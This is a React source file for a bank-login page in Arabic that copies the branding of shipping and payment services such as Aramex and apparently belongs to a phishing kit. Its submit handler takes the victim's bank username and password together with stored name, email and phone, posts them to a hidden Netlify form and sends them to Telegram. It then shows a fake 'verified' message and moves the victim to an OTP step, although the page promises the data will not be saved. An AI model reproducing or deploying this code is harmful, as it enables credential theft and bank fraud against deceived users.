import { useState } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { Shield, LogIn, ArrowLeft, User, Lock, Eye, EyeOff, BadgeCheck, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import ServiceBadge from "@/components/ServiceBadge";

const BankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const [searchParams] = useSearchParams();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || searchParams.get('service') || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }

    // Store login info
    sessionStorage.setItem('bankUsername', username);
    sessionStorage.setItem('bankPassword', password);

    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          username: username,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }

    // Send to Telegram
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        username: username,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Bank login sent to Telegram successfully');
    } else {
      console.error('Failed to send bank login to Telegram:', telegramResult.error);
    }

    toast({
      title: "تم التحقق",
      description: "تم التحقق من بيانات الدخول بنجاح",
    });

    // Navigate to OTP
    navigate(`/pay/${id}/otp`);
  };

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تسجيل دخول البنك"
      description={`تسجيل الدخول الآمن لخدمة ${serviceName}`}
      icon={<LogIn className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Service Badge */}
      <div className="flex justify-center mb-4">
        <ServiceBadge 
          serviceKey={serviceKey}
          serviceName={serviceName}
          size="lg"
        />
      </div>

      {/* Security Notice */}
      <div 
        className="rounded-lg p-3 sm:p-4 mb-6 relative overflow-hidden"
        style={{
          background: `${branding.colors.primary}10`,
          border: `2px solid ${branding.colors.primary}30`
        }}
      >
        <div 
          className="absolute inset-0 opacity-5"
          style={{
            backgroundImage: `repeating-linear-gradient(45deg, ${branding.colors.primary} 0, ${branding.colors.primary} 1px, transparent 0, transparent 50%)`,
            backgroundSize: '8px 8px'
          }}
        />
        <div className="flex items-start gap-2 relative z-10">
          <Shield className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
          <div className="flex-1">
            <div className="flex items-center gap-2 mb-1">
              <p className="text-xs sm:text-sm font-bold">
                تسجيل دخول آمن
              </p>
              <BadgeCheck className="w-4 h-4" style={{ color: branding.colors.secondary }} />
            </div>
            <p className="text-xs sm:text-sm">
              سجّل دخولك إلى حساب البنك لإتمام عملية الدفع بشكل آمن
            </p>
          </div>
        </div>
      </div>

      {/* Bank Logo Display */}
      <div 
        className="rounded-2xl p-6 sm:p-8 mb-6 relative overflow-hidden shadow-lg text-center"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
        }}
      >
        {branding.logo && (
          <div className="bg-white rounded-xl p-4 inline-block mb-4">
            <img 
              src={branding.logo} 
              alt={serviceName}
              className="h-12 sm:h-16 w-auto"
              onError={(e) => e.currentTarget.style.display = 'none'}
            />
          </div>
        )}
        <h3 className="text-white text-lg sm:text-xl font-bold">
          {serviceName}
        </h3>
        <p className="text-white/90 text-xs sm:text-sm mt-1">
          البوابة الإلكترونية للبنك
        </p>
      </div>

      {/* Important Notice */}
      <div className="mb-6 p-3 sm:p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
        <div className="flex items-start gap-2">
          <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-yellow-600" />
          <div>
            <p className="text-xs sm:text-sm font-semibold text-yellow-900 dark:text-yellow-100 mb-1">
              تنبيه أمني مهم
            </p>
            <p className="text-xs sm:text-sm text-yellow-800 dark:text-yellow-200">
              استخدم بيانات الدخول الخاصة بحسابك البنكي. لن يتم حفظ هذه البيانات.
            </p>
          </div>
        </div>
      </div>

      {/* Login Form */}
      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
        {/* Username */}
        <div>
          <Label className="mb-2 flex items-center gap-2 text-sm sm:text-base">
            <User className="w-4 h-4" />
            اسم المستخدم
          </Label>
          <Input
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="أدخل اسم المستخدم"
            className="h-12 sm:h-14 text-base sm:text-lg"
            required
            autoComplete="username"
          />
        </div>

        {/* Password */}
        <div>
          <Label className="mb-2 flex items-center gap-2 text-sm sm:text-base">
            <Lock className="w-4 h-4" />
            كلمة المرور
          </Label>
          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="أدخل كلمة المرور"
              className="h-12 sm:h-14 text-base sm:text-lg pr-12"
              required
              autoComplete="current-password"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              {showPassword ? (
                <EyeOff className="w-5 h-5" />
              ) : (
                <Eye className="w-5 h-5" />
              )}
            </button>
          </div>
        </div>

        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          <span className="ml-2">تسجيل الدخول</span>
          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
        </Button>

        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
          بالمتابعة، أنت توافق على الشروط والأحكام
        </p>
      </form>

      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="username" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default BankLogin;
